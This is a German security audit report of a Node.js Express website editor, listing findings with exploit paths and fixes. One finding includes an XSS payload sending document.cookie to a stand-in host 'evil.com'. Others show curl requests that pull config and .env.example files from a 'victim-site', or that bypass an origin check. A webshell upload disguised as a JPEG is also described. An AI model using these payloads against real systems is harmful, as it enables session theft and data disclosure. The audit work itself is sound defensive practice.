# Security Audit – Studio Node.js System
**Datum:** 2026-05-05  
**Prüfer:** Verdent Security Audit  
**Scope:** `/home/clawd/saas/studio`

---

## Executive Summary

Das System ist ein lokaler Website-Editor auf Basis von Express.js mit Magic-Link-Authentifizierung. Die Grundarchitektur ist solide, aber es gibt **5 HOCH**- und **8 MITTEL**-Findings, die vor dem Produktionseinsatz behoben werden müssen. Kein KRITISCH-Finding wurde identifiziert.

---

## Findings

---

### [HOCH-1] Fehlende MIME-Type Magic-Bytes-Prüfung beim Upload

**Kategorie:** File Upload Security  
**Datei:** `editor/server.js`, Zeilen 105–116  

**Beschreibung:**  
Der Multer-Filter prüft `file.mimetype` – dieser Wert kommt direkt aus dem HTTP-Header `Content-Type`, den der Client selbst setzt. Es findet **keine Magic-Bytes-Prüfung** (echte Dateiinhalt-Analyse) statt. Ein Angreifer kann eine PHP-Webshell als `image/jpeg` deklarieren und hochladen.

**Exploit-Pfad:**  
1. Authentifizierter User (oder gestohlene Session) sendet POST `/api/upload-image` mit einer `.php`-Datei und setzt `Content-Type: image/jpeg`.  
2. Multer akzeptiert die Datei, vergibt ihr eine UUID + `.jpg`-Extension.  
3. Zwar wird `.jpg` erzwungen, aber wenn der Webserver (nginx/apache) PHP-Dateien nach Extension auflöst und der Angreifer die Extension manipuliert (z.B. Double-Extension oder Null-Byte), ist RCE möglich. Außerdem können SVGs mit eingebettetem Script als XSS genutzt werden (kein SVG im Filter, aber erweiterbar).

**Empfohlener Fix:**  
```js
// npm install file-type
const { fileTypeFromBuffer } = require('file-type');

upload.single('image')(req, res, async (err) => {
  if (err || !req.file) return res.status(400).json({ error: 'Upload fehlgeschlagen' });
  const buffer = fs.readFileSync(req.file.path);
  const type = await fileTypeFromBuffer(buffer);
  const allowed = ['image/jpeg', 'image/png', 'image/webp'];
  if (!type || !allowed.includes(type.mime)) {
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'Ungültiger Dateityp (Magic Bytes)' });
  }
  // ...
});
```

---

### [HOCH-2] Memory-Leak / DoS durch unbegrenzte `tokens`-Map

**Kategorie:** Rate Limiting & DoS  
**Datei:** `editor/server.js`, Zeilen 33, 241–272  

**Beschreibung:**  
Die `tokens`-Map wächst unbegrenzt. Expired-Token-Cleanup findet nur bei `/auth/verify`-Aufrufen statt (Zeile 276–278). Wenn ein Angreifer mit 10 req/min (Rate-Limiter) kontinuierlich neue Token anfordert, accumulates die Map. Ein `uuidv4`-Token ist 128 Bit (36 Bytes String) + Objekt-Overhead ≈ ~200 Bytes/Entry. Bei 24/7-Betrieb über Wochen summiert sich das, bis der Node.js-Prozess abstürzt.

**Exploit-Pfad:**  
Rate-Limit umgehen über mehrere IPs → 10 req/min pro IP → mit 10 IPs 100 req/min → über 24h = 144.000 Einträge → ~28 MB/day Memory-Wachstum. Bei Servern mit wenig RAM OOM in Tagen.

**Empfohlener Fix:**  
```js
// Periodisches Cleanup alle 15 Minuten
setInterval(() => {
  const now = Date.now();
  for (const [key, val] of tokens) {
    if (val.expires < now) tokens.delete(key);
  }
}, 15 * 60 * 1000);
```

---

### [HOCH-3] `checkOrigin` Middleware umgehbar

**Kategorie:** Authorization  
**Datei:** `editor/server.js`, Zeilen 88–94  

**Beschreibung:**  
Die `checkOrigin`-Funktion prüft `Origin` oder `Referer`. Beide Header sind **clientseitig setzbar** und werden von Browsern nur bei Cross-Origin-Requests automatisch gesetzt. Ein direkter HTTP-Request (curl, Postman, bösartiges Skript) kann einfach keinen Origin-Header senden – die Bedingung `if (origin && ...)` ist dann falsch, und der Check wird **übersprungen** (`next()` wird aufgerufen).

```js
// Zeile 90: origin ist leer → Bedingung false → next() → kein Check
if (origin && !origin.startsWith(resolvedSiteUrl) && !origin.startsWith(`http://localhost`)) {
```

**Exploit-Pfad:**  
```bash
curl -X POST http://server/api/save \
  -H "Cookie: studio_session=<valid_jwt>" \
  -H "Content-Type: application/json" \
  -d '{"key":"hero_headline","value":"HACKED"}'
```
Kein Origin-Header → `checkOrigin` schlägt nicht an → Schreibzugriff ohne Origin-Prüfung.

**Empfohlener Fix:**  
Den Check als zusätzliche Sicherheitsschicht beibehalten, aber nie als primären Schutz betrachten. CSRF-Schutz via `sameSite: 'strict'` auf dem Cookie ist der eigentliche Schutz (korrekt implementiert). Den `checkOrigin`-Middleware-Kommentar entsprechend anpassen oder die Logik umkehren: **Nur erlaubte Origins zulassen statt unbekannte ablehnen**.

---

### [HOCH-4] CVE: Nodemailer DoS durch rekursiven Address-Parser

**Kategorie:** Dependencies  
**Datei:** `package.json`, Zeile 17  
**CVE:** GHSA-rcmh-qjqh-p98v (CVSS 7.5 – HIGH)  

**Beschreibung:**  
`nodemailer ^6.9.13` (installiert: `6.x`) ist verwundbar gegen einen DoS-Angriff. Der `addressparser` ist anfällig für rekursive Aufrufe mit speziell gestalteten E-Mail-Adressen, was den Node.js-Event-Loop blockiert.

**Exploit-Pfad:**  
Falls der `editorEmail`-Wert aus einer externen Quelle stammte oder wenn ein Angreifer `POST /auth/request-link` mit einer speziell konstruierten E-Mail-Adresse aufruft (Prüfung auf Zeile 243 schlägt zuerst fehl, aber abhängig von der Implementierung), kann der Server blockiert werden.

**Empfohlener Fix:**  
```bash
npm install nodemailer@latest  # >= 8.0.7
```
Achtung: Breaking Changes in v7/v8 – Migration prüfen.

---

### [HOCH-5] `express.static(CLIENT_DIR)` exponiert `config.json` und `content.json`

**Kategorie:** Information Disclosure  
**Datei:** `editor/server.js`, Zeile 374  

**Beschreibung:**  
```js
app.use(express.static(CLIENT_DIR));
```
`CLIENT_DIR` ist das Client-Verzeichnis. Darin liegen `config.json` und `content.json`. Diese sind über HTTP direkt abrufbar:
- `GET /config.json` → liefert `editorEmail`, GPS-Koordinaten, `siteUrl`, vollständige Geschäftsdaten
- `GET /content.json` → liefert alle Textinhalte der Website

`config.json` enthält `editorEmail` – der Login-E-Mail-Zieladresse. Ein Angreifer kann diese auslesen und gezielt Social-Engineering oder Phishing-Angriffe gegen den Editor-Account starten.

Zusätzlich: `GET /.env.example` (wird von `generate.js` in `CLIENT_DIR` geschrieben) ist ebenfalls über static file serving erreichbar.

**Exploit-Pfad:**  
```bash
curl http://victim-site/config.json      # → editorEmail, GPS, alle Daten
curl http://victim-site/content.json     # → alle Textinhalte
curl http://victim-site/.env.example     # → SMTP-Konfigurationsstruktur
```

**Empfohlener Fix:**  
Sensitive Dateien explizit blockieren, bevor `express.static` aufgerufen wird:
```js
const BLOCKED_FILES = ['config.json', 'content.json', '.env', '.env.example', 'llms-full.txt'];
app.use((req, res, next) => {
  const basename = path.basename(req.path);
  if (BLOCKED_FILES.includes(basename)) return res.status(404).send('Not Found');
  next();
});
app.use(express.static(CLIENT_DIR));
```

---

### [MITTEL-1] JWT ohne expliziten Algorithmus verifiziert

**Kategorie:** Authentication & Session Management  
**Datei:** `editor/server.js`, Zeile 80  

**Beschreibung:**  
```js
const decoded = jwt.verify(token, JWT_SECRET);
```
Kein `algorithms`-Parameter angegeben. `jsonwebtoken` v9 akzeptiert standardmäßig HMAC-Algorithmen, **aber** ohne explizite Einschränkung sind theoretisch Algorithm-Confusion-Angriffe (`alg: none`) möglich, falls die Bibliothek durch Updates das Verhalten ändert. Best Practice ist immer explizit:

**Empfohlener Fix:**  
```js
const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
// Auch bei sign:
jwt.sign({ email: data.email }, JWT_SECRET, { expiresIn: '24h', algorithm: 'HS256' });
```

---

### [MITTEL-2] Kein CSP (Content Security Policy) Header gesetzt

**Kategorie:** Security Headers  
**Datei:** `editor/server.js`, Zeilen 41–48  

**Beschreibung:**  
Die Security-Header-Middleware setzt `X-Frame-Options`, `X-Content-Type-Options`, `X-XSS-Protection`, `Referrer-Policy` und `Permissions-Policy` – aber **kein `Content-Security-Policy`**. Das `X-XSS-Protection: 1; mode=block`-Header ist von modernen Browsern deprecated und bietet keinen echten Schutz.

Ohne CSP kann XSS-Payload freier arbeiten: inline Scripts sind erlaubt, externe Script-Quellen unbegrenzt.

**Empfohlener Fix:**  
```js
res.setHeader('Content-Security-Policy',
  "default-src 'self'; " +
  "script-src 'self' 'unsafe-inline'; " +  // 'unsafe-inline' nötig für Overlay
  "style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data: blob:; " +
  "font-src 'self'; " +
  "connect-src 'self'; " +
  "frame-ancestors 'none';"
);
```

---

### [MITTEL-3] Kein HSTS-Header

**Kategorie:** Security Headers  
**Datei:** `editor/server.js`, Zeilen 41–48  

**Beschreibung:**  
`Strict-Transport-Security` (HSTS) fehlt. Ohne HSTS können Man-in-the-Middle-Angriffe Session-Cookies abfangen, auch wenn die Site HTTPS nutzt (erster Aufruf via HTTP möglich).

Zudem ist der Cookie `secure`-Flag nur bei `NODE_ENV === 'production'` gesetzt (Zeile 296). In Development-Umgebungen mit HTTP wird das Cookie im Klartext übertragen.

**Empfohlener Fix:**  
```js
if (process.env.NODE_ENV === 'production') {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
}
```

---

### [MITTEL-4] `upload-image`: Key-Validierung fehlt für Content-Update

**Kategorie:** Input Validation  
**Datei:** `editor/server.js`, Zeilen 363–371  

**Beschreibung:**  
```js
const key = req.body.key;
if (key && key in content) {  // Zeile 365: "key in content" – kein ALLOWED_CONTENT_KEYS-Check!
  content[key] = relativePath;
```

Für `/api/save` gibt es `ALLOWED_CONTENT_KEYS` (Zeile 318). Für `/api/upload-image` wird stattdessen `key in content` geprüft – d.h. jeder Key der bereits in `content.json` existiert, kann überschrieben werden. Das erlaubt potentiell das Überschreiben von Keys die nicht in der Whitelist stehen, falls `content.json` solche enthält.

Außerdem: Prototype-Pollution via `key = '__proto__'` – `'__proto__' in content` ist bei älteren Node-Versionen `true`.

**Empfohlener Fix:**  
```js
const key = req.body.key;
if (key && ALLOWED_CONTENT_KEYS.has(key)) {
  content[key] = relativePath;
  // ...
}
```

---

### [MITTEL-5] Session-Invalidierung bei Logout unvollständig

**Kategorie:** Authentication & Session Management  
**Datei:** `editor/server.js`, Zeilen 305–308  

**Beschreibung:**  
```js
app.get('/auth/logout', (req, res) => {
  res.clearCookie('studio_session');
  res.redirect('/');
});
```

Der JWT wird nur client-seitig gelöscht (Cookie wird gecleart). Der Token selbst bleibt bis zu seiner Expiry (24h) serverseitig gültig. Wenn ein Angreifer den Cookie vor dem Logout extrahiert hat (z.B. via XSS, Browser-History, Proxy-Log), kann er die Session noch bis zu 24h nutzen.

JWT-basierte Systeme haben dieses inhärente Problem – es gibt keine serverseitige Token-Blacklist.

**Empfohlener Fix:**  
Eine Blacklist für invalidierte Tokens führen (analog zur `tokens`-Map für Magic-Links):
```js
const invalidatedSessions = new Set();

app.get('/auth/logout', (req, res) => {
  const token = req.cookies['studio_session'];
  if (token) invalidatedSessions.add(token);
  res.clearCookie('studio_session');
  res.redirect('/');
});

function isAuthenticated(req, res, next) {
  const token = req.cookies['studio_session'];
  if (!token || invalidatedSessions.has(token)) return res.status(401).json({ error: 'Nicht eingeloggt' });
  // ...
}
```

---

### [MITTEL-6] `/.env` nicht durch express.static geschützt

**Kategorie:** Deployment-Sicherheit  
**Datei:** `editor/server.js`, Zeile 374; `.gitignore`, Zeile 3  

**Beschreibung:**  
`.gitignore` enthält `clients/*/.env` – das schützt vor einem Git-Commit. Aber wenn der Editor-Server in `CLIENT_DIR` läuft und die `.env`-Datei dort liegt, ist sie über `express.static(CLIENT_DIR)` theoretisch abrufbar als `GET /.env`, sofern der Webserver die Anfrage nicht vorher blockiert.

Der `.env`-Inhalt enthält `JWT_SECRET`, `SMTP_PASS` – absolute Kompromittierung des Systems.

**Empfohlener Fix:**  
Explizit `.env`-Dateien blockieren (siehe Fix zu HOCH-5), und empfehlen, `.env` **außerhalb** von `CLIENT_DIR` zu speichern.

---

### [MITTEL-7] Template Injection: Config-Felder ohne HTML-Escaping

**Kategorie:** Template/HTML Security  
**Datei:** `generator/generate.js`, Zeile 134–138; `generator/add-page.js`, Zeile 162  

**Beschreibung:**  
```js
for (const [key, val] of Object.entries(allTokens)) {
  if (typeof val === 'string' || typeof val === 'number') {
    html = html.split(`{{${key}}}`).join(String(val));
  }
}
```

`allTokens` enthält `config`-Felder direkt (Zeile 126: `Object.assign({}, config, content, ...)`). Falls ein `config.json`-Feld HTML-Zeichen enthält (z.B. `businessName: "Firma <script>alert(1)</script>"`), werden diese **unescaped** in die generierte HTML eingebettet.

Da `config.json` manuell befüllt wird (kein User-Input über das Web), ist die Angriffsfläche begrenzt. Aber ein böswilliger Studio-Operator könnte damit XSS in die generierten Seiten einbetten.

**Exploit-Pfad:**  
```json
{ "businessName": "Test\"><script>document.location='https://evil.com/?c='+document.cookie</script>" }
```
→ `studio generate client` → `index.html` enthält XSS.

**Empfohlener Fix:**  
HTML-Escape-Funktion für Template-Rendering verwenden:
```js
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
// Nur für non-JSON-LD-Tokens anwenden
```
**Ausnahme:** `schemaOrgJsonLd` und `faqSchemaJsonLd` werden korrekt via `JSON.stringify` escaped.

---

### [MITTEL-8] Timing-Attack auf Magic-Link-Token-Prüfung

**Kategorie:** Authentication  
**Datei:** `editor/server.js`, Zeile 281  

**Beschreibung:**  
```js
if (!token || !tokens.has(token)) {
```
`Map.has()` ist keine constant-time Operation für String-Vergleiche. Bei UUID-Tokens mit 128-Bit Entropie ist der praktische Exploit-Nutzen minimal, aber die Best Practice ist timing-safe comparison.

**Empfohlener Fix:**  
UUIDs haben ausreichend Entropie (2^122), daher ist dies eher eine theoretische Schwäche. Trotzdem: `crypto.timingSafeEqual()` für String-Vergleiche nutzen, wenn der Token aus einem Subset stammt.

---

### [NIEDRIG-1] `X-XSS-Protection: 1; mode=block` ist deprecated

**Kategorie:** Security Headers  
**Datei:** `editor/server.js`, Zeile 44  

**Beschreibung:**  
Dieser Header ist in modernen Browsern (Chrome 78+, Firefox) entfernt und kann in Edge sogar XSS-Angriffe ermöglichen statt verhindern. Er sollte entfernt und durch CSP ersetzt werden.

**Empfohlener Fix:** Header entfernen, CSP implementieren (siehe MITTEL-2).

---

### [NIEDRIG-2] `clientname` Parameter in CLI nicht gegen Path Traversal abgesichert

**Kategorie:** Path Traversal  
**Datei:** `cli/studio.js`, Zeile 44; `generator/add-page.js`, Zeile 27  

**Beschreibung:**  
```js
const clientDir = path.join(__dirname, '../clients', clientname);
```
`path.join` normalisiert `../`-Sequences. Ein Aufruf wie `studio generate ../../etc/passwd` würde von `path.join` zu `/home/clawd/saas/etc/passwd` aufgelöst und dann geprüft ob es ein Verzeichnis ist (existiert nicht → Fehler). Der Schutz ist implizit durch `path.join`-Normalisierung vorhanden, aber **nicht explizit validiert**.

CLI-Tools sind typischerweise vom Admin bedient, aber eine explizite Validierung ist gute Praxis.

**Empfohlener Fix:**  
```js
if (!/^[a-z0-9][a-z0-9\-_]*$/.test(clientname)) {
  err('Ungültiger Clientname. Nur a-z, 0-9, - und _ erlaubt.');
  process.exit(1);
}
```

---

### [NIEDRIG-3] `data/updates/*.md`-Dateien in `.gitignore`, aber Verzeichnis exponiert

**Kategorie:** Information Disclosure  
**Datei:** `.gitignore`, Zeile 5  

**Beschreibung:**  
`.gitignore` schließt `data/updates/*.md` aus. Das `data/`-Verzeichnis liegt im Studio-Root, nicht in `CLIENT_DIR`, also ist es nicht über `express.static` erreichbar (korrekt). Kein Exploit-Risiko im laufenden Betrieb.

**Info:** Die Update-Logs enthalten Client-Namen und Aktions-Beschreibungen – kein kritischer Inhalt, aber korrekt aus Git herausgehalten.

---

### [NIEDRIG-4] `loginPageHtml()` bettet `businessName` unescaped ein

**Kategorie:** XSS  
**Datei:** `editor/server.js`, Zeilen 124, 190  

**Beschreibung:**  
```js
<title>Bearbeitungsmodus – ${businessName}</title>
<h1>Bearbeitungsmodus – ${businessName}</h1>
```

`businessName` kommt aus `config.json` (geladen beim Server-Start, Zeile 27–30). Wenn `config.json` ein XSS-Payload im `businessName`-Feld enthält, wird dieser in der Login-Seite unescaped gerendert. Da `config.json` vom Admin kontrolliert wird, ist das Impact gering.

**Empfohlener Fix:**  
```js
const escHtml = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
// Dann: ${escHtml(businessName)}
```

---

### [INFO-1] `multer` Version 1.4.5-lts.2

**Kategorie:** Dependencies  
**Datei:** `package.json`, Zeile 22  

Multer `1.4.5-lts.2` ist die aktuelle LTS-Version (Multer 2.x ist in Development). Keine bekannten kritischen CVEs. Der Upload läuft in den lokalen `assets/uploads/`-Ordner, der von `express.static` direkt servert wird (Dateien sind also öffentlich erreichbar via URL). Dies ist gewollt (Bilder sollen angezeigt werden), aber es müssen strikte MIME-Checks gelten (siehe HOCH-1).

---

### [INFO-2] `uuid` CVE GHSA-w5hq-g745-h8pq

**Kategorie:** Dependencies  
**Datei:** `package.json`, Zeile 19  

**Beschreibung:**  
`uuid ^9.0.1` hat eine moderate CVE (Out-of-bounds write bei `v3/v5/v6` wenn `buf`-Parameter genutzt wird). Im Code wird `v4: uuidv4` verwendet (Zeile 6) – `v4` ist **nicht betroffen**. Dennoch Update auf `uuid@14` empfohlen wenn Breaking-Changes akzeptabel.

---

### [INFO-3] `ogImage` Token ohne Default-Schutz in Templates

**Kategorie:** Template Security  
**Datei:** `generator/add-page.js`, Zeile 159  

`ogImage` wird auf `'assets/images/hero.jpg'` gesetzt als Default. Falls das Bild nicht existiert, gibt es einen broken Image-Link in OG-Tags – kein Security-Problem, aber für Produktionssysteme relevant.

---

### [INFO-4] `.gitignore` schließt `clients/*/assets/uploads/` korrekt aus

**Kategorie:** Deployment-Sicherheit  
**Datei:** `.gitignore`, Zeile 3  

Positive Feststellung: Upload-Verzeichnisse werden korrekt aus Git ausgeschlossen. Kein Handlungsbedarf.

---

## Gesamtbewertung

| Kategorie                        | Bewertung  | Begründung                                               |
|----------------------------------|------------|----------------------------------------------------------|
| Authentication & Session Mgmt    | B          | Magic-Link gut implementiert, CSRF via sameSite=strict OK, aber keine Session-Blacklist |
| Authorization                    | B+         | Alle API-Routen hinter `isAuthenticated`, checkOrigin hat Lücke |
| Input Validation & Injection     | B          | ALLOWED_CONTENT_KEYS vorhanden, Upload-Key-Validation fehlt |
| File Upload Security             | C+         | Dateigrößen-Limit und Extension-Mapping, aber kein Magic Bytes |
| Rate Limiting & DoS              | B-         | Auth-Limiter und Global-Limiter vorhanden, Memory-Leak-Risiko |
| Information Disclosure           | C          | config.json/content.json über static erreichbar – KRITISCH für Prod |
| Security Headers                 | C+         | Grundlegende Headers, kein CSP, kein HSTS               |
| Dependencies                     | C+         | Nodemailer HIGH CVE ungefixed                            |
| Template Security                | B-         | JSON-LD korrekt escaped, HTML-Template unescaped         |
| Deployment-Sicherheit            | B          | .env in .gitignore, aber über static erreichbar          |

**Gesamt-Score: C+ / 6.5 von 10**

---

## Priorisierte Fix-Liste

### Sofort (vor Produktionseinsatz zwingend)

1. **[HOCH-5]** `config.json`, `content.json`, `.env`, `.env.example` via Middleware blockieren bevor `express.static` – **5 Minuten Fix**, verhindert Info-Leak des `editorEmail` und aller Kundendaten.

2. **[HOCH-2]** Periodisches Cleanup der `tokens`-Map – **2 Minuten Fix**, verhindert Memory-Leak.

3. **[MITTEL-4]** `upload-image`: Key gegen `ALLOWED_CONTENT_KEYS` statt `key in content` prüfen – **1 Minuten Fix**.

4. **[HOCH-4]** `nodemailer` updaten auf `>= 8.0.7` – Migration-Guide prüfen, danach `npm install nodemailer@latest`.

### Kurzfristig (innerhalb 1 Woche)

5. **[HOCH-1]** Magic-Bytes-Prüfung beim Datei-Upload implementieren (Paket `file-type`).

6. **[MITTEL-2]** Content Security Policy Header hinzufügen.

7. **[MITTEL-3]** HSTS-Header für Produktionsumgebung aktivieren.

8. **[MITTEL-5]** JWT-Blacklist für Logout implementieren (einfache In-Memory-Set-Lösung).

9. **[MITTEL-1]** Expliziten `algorithms: ['HS256']`-Parameter in `jwt.verify()` und `jwt.sign()`.

### Mittelfristig (innerhalb 1 Monat)

10. **[MITTEL-7]** HTML-Escaping für Template-Rendering in `generate.js` und `add-page.js`.

11. **[NIEDRIG-1]** `X-XSS-Protection`-Header entfernen.

12. **[NIEDRIG-2]** `clientname`-Validierung in CLI mit Regex.

13. **[NIEDRIG-4]** `businessName` in `loginPageHtml()` HTML-escapen.

14. **[INFO-2]** `uuid` auf v14 updaten (low priority, v4 nicht betroffen).

---

*Audit-Datei generiert: 2026-05-05*
